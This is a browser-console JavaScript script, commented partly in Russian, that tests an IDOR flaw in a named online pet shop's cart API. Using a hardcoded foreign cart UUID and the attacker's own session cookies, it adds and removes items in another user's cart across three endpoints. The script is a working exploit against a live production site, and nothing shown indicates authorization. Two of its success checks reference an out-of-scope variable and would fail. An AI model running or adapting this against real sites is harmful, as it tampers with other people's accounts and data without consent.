// JavaScript для выполнения в браузере (Account B залогинен)
// Открыть DevTools → Console → вставить этот код

console.log("[*] Testing cart write IDOR from browser...");

const CART_UUID = "6bd223b4-5040-4faa-ba85-6a85c1ec2d50";
const OFFER_ID = 2966095; // Real offerId from catalog

// Test 1: Add article to foreign cart
console.log("[*] Test 1: Add article to foreign cart");
fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}/articles`, {
  method: "POST",
  credentials: "include",
  headers: {
    "Content-Type": "application/json",
    "x-requested-with": "XMLHttpRequest"
  },
  body: JSON.stringify({
    "offerId": OFFER_ID
  })
})
.then(r => {
  console.log(`    HTTP ${r.status}`);
  return r.text();
})
.then(text => {
  console.log(`    Response: ${text.substring(0, 500)}`);
  if (text.includes('"id"') || text.includes('article')) {
    console.log("    [!!!] SUCCESS! Article added!");
  }
  
  // Verify
  return fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}`, {
    credentials: "include"
  });
})
.then(r => r.json())
.then(cart => {
  console.log(`    Cart now has ${cart.articles.length} items`);
  if (cart.articles.length > 3) {
    console.log("    [!!!] VERIFIED: Cart modified!");
  }
})
.catch(e => console.error("    Error:", e));

// Test 2: Add via /add endpoint
setTimeout(() => {
  console.log("\n[*] Test 2: Add via /add endpoint");
  fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}/add`, {
    method: "POST",
    credentials: "include",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded"
    },
    body: `offerId=${OFFER_ID}&quantity=1`
  })
  .then(r => {
    console.log(`    HTTP ${r.status}`);
    return r.text();
  })
  .then(text => {
    console.log(`    Response: ${text.substring(0, 500)}`);
    if (r.status === 200 || r.status === 201) {
      console.log("    [!!!] SUCCESS!");
    }
  })
  .catch(e => console.error("    Error:", e));
}, 2000);

// Test 3: Remove article
setTimeout(() => {
  console.log("\n[*] Test 3: Remove article");
  fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}/articles/2966422/remove`, {
    method: "POST",
    credentials: "include"
  })
  .then(r => {
    console.log(`    HTTP ${r.status}`);
    return r.text();
  })
  .then(text => {
    console.log(`    Response: ${text.substring(0, 500)}`);
    if (r.status === 200 || r.status === 204) {
      console.log("    [!!!] SUCCESS! Article removed!");
    }
  })
  .catch(e => console.error("    Error:", e));
}, 4000);

